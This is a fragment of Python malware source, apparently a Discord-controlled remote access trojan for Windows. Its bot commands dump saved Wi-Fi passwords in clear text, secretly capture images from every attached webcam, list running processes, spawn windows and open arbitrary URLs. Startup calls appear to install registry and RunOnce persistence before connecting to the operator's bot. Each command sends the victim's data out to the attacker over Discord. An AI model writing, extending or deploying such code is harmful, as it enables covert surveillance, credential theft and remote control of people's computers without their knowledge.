        return result.stdout
    except UnicodeDecodeError:
        try:
            result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding='cp1252')
            return result.stdout
        except Exception as e:
            return f"Error executing command: {e}"

@bot.command()
async def network(ctx):
    try:
        output = run_command("netsh wlan show profiles")
        
        if output:
            embed = discord.Embed(
                title="🌐 Network",
                description=f"🌐 **Wi-Fi Networks**:\n```\n{output}\n```",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="🌐 Network",
                description=f"No Wi-Fi networks found.",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
    
    except Exception as e:
        embed = discord.Embed(
            title="🌐 Network",
            description=f"Error: {e}",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

@bot.command()
async def net_pass(ctx, wifi_name: str):
    try:
        output = run_command(f'netsh wlan show profile name="{wifi_name}" key=clear')
        if output:
            embed = discord.Embed(
                title="🔑 Network Password",
                description=f"🔑 **Password for {wifi_name}**: `{output}`",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="🔑 Network Password",
                description=f"🔑 No Password for {wifi_name} found.",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        
    
    except Exception as e:
        embed = discord.Embed(
            title="🔑 Network Password",
            description=f"Error: {e}",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

@bot.command()
async def disk(ctx):
    system_info = get_system_info()
    embed = discord.Embed(
        title="📦 Disk Usage",
        description=f"Disk Usage: {system_info['Disk Info']}",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

@bot.command()
async def cpu(ctx):
    system_info = get_system_info()
    embed = discord.Embed(
        title="⚙️ CPU Usage",
        description=f"CPU Usage: {system_info['CPU Usage']}",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

@bot.command()
async def ram(ctx):
    system_info = get_system_info()
    embed = discord.Embed(
        title="💾 RAM Usage",
        description=f"RAM Usage: {system_info['RAM Usage']}",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

@bot.command()
async def overview(ctx):
    system_info = get_system_info()
    embed = discord.Embed(
        title="🛠️ System Overview",
        color=0x00ff00
    )
    embed.add_field(name="⚙️ CPU Usage", value=system_info["CPU Usage"], inline=False)
    embed.add_field(name="💾 RAM Usage", value=system_info["RAM Usage"], inline=False)
    embed.add_field(name="🗂️ Disk Usage", value=system_info["Disk Info"], inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def battery(ctx):
    battery_info = get_battery_status()
    embed = discord.Embed(
        title="🔋 Battery Status",
        description=battery_info,
        color=0x00ff00
    )
    await ctx.send(embed=embed)

@bot.command()
async def webcam(ctx):
    try:
        webcam_images = []

        for cam_index in range(10):
            webcam = cv2.VideoCapture(cam_index)
            ret, frame = webcam.read()
            webcam.release()

            if ret:
                file_path = os.path.join(temp_folder, f"webcam_image_{cam_index}.png")
                cv2.imwrite(file_path, frame)
                webcam_images.append(file_path)

        if not webcam_images:
            await ctx.send("❌ No available webcams detected. Please ensure they are connected and accessible.")
            return

        embed = discord.Embed(
            title="📸 Webcam",
            description="Successfully captured images from available webcams:",
            color=0x00ff00
        )

        for file_path in webcam_images:
            file = discord.File(file_path, filename=os.path.basename(file_path))
            embed.set_image(url=f"attachment://{os.path.basename(file_path)}")
            await ctx.send(embed=embed, file=file)

            os.remove(file_path)

    except Exception as e:
        await ctx.send(f"❌ An error occurred while accessing the webcams: {e}")

@bot.command()
async def tasks(ctx):
    tasks_info = get_running_tasks()
    
    file_path = os.path.join(temp_folder, "tasks_list.txt")
    
    with open(file_path, "w") as file:
        file.write("\n".join(tasks_info))
    
    await ctx.send(file=discord.File(file_path))

@bot.command()
async def fakecmd(ctx, count: int):
    try:
        embed = discord.Embed(
            title="💻 Fake CMD",
            description=f"Successfully spammed {count} CMD windows:",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

        for i in range(count):
            subprocess.Popen('start cmd.exe', shell=True)

            time.sleep(0.03)

            subprocess.Popen('taskkill /f /im cmd.exe', shell=True)
    
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")

@bot.command()
async def web_open(ctx, url):
    os.system(f"start {url}")
    embed = discord.Embed(
        title="🌍 Webbrowser",
        description=f"🌍 Opened {url} in the browser!",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

check_token()
hzzh()
hzzhtemp()
hzzhreg()
hzzh_runonce()
wait_for_wifi()
bot.run(HzzH)
